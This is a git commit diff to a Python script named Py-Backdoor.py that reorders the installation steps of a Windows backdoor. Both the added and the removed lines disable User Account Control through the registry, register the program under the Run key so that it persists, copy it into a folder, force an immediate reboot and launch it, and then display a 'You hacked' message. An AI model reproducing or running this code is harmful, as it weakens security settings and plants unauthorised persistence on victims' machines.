1c53204cda1eceb3d66990f81ae34ba0e486acd4
Twoicefish <team.k0konutz@gmail.com>
2022-07-20 15:43:07 +0900

    # First commit

--- Py-Backdoor.py
+++ Py-Backdoor.py
@@ -20,17 +20,15 @@ if sys.argv[-1] != ASADMIN:
 
 if os.path.isfile(os.path.join(ROOT_PATH,'Winx')) is False:
     # root 파일을 레지스트리에 등록
-
     try:
         os.mkdir(os.path.join(ROOT_PATH,'Winx'))
+        os.system('reg.exe ADD HKLM\SOFTWARE\Mi crosoft\Windows\CurrentVersion\Policies\System /f /v EnableLUA /t REG_DWORD /d 0 /f')
+        os.system(f'reg.exe ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /f /v Winx /t REG_SZ /d "{ROOT_PATH}\\{PROG_NAME}"')
+        os.system('shutdown /r /f /t 1')
+        os.system(os.path.join(ROOT_PATH,PROG_NAME))
+        copyfile(sys.argv[0], os.path.join(ROOT_PATH, PROG_NAME))
     except FileExistsError:
         pass
-    copyfile(sys.argv[0], os.path.join(ROOT_PATH, PROG_NAME))
-
-    os.system('reg.exe ADD HKLM\SOFTWARE\Mi crosoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f')
-    os.system(f'reg.exe ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Winx /t REG_SZ /d "{ROOT_PATH}\\{PROG_NAME}"')
-    os.system('shutdown /r /f /t 0')
-    os.system(os.path.join(ROOT_PATH,PROG_NAME))
     sys.exit()
 
 os.system('msg %username% You hacked')
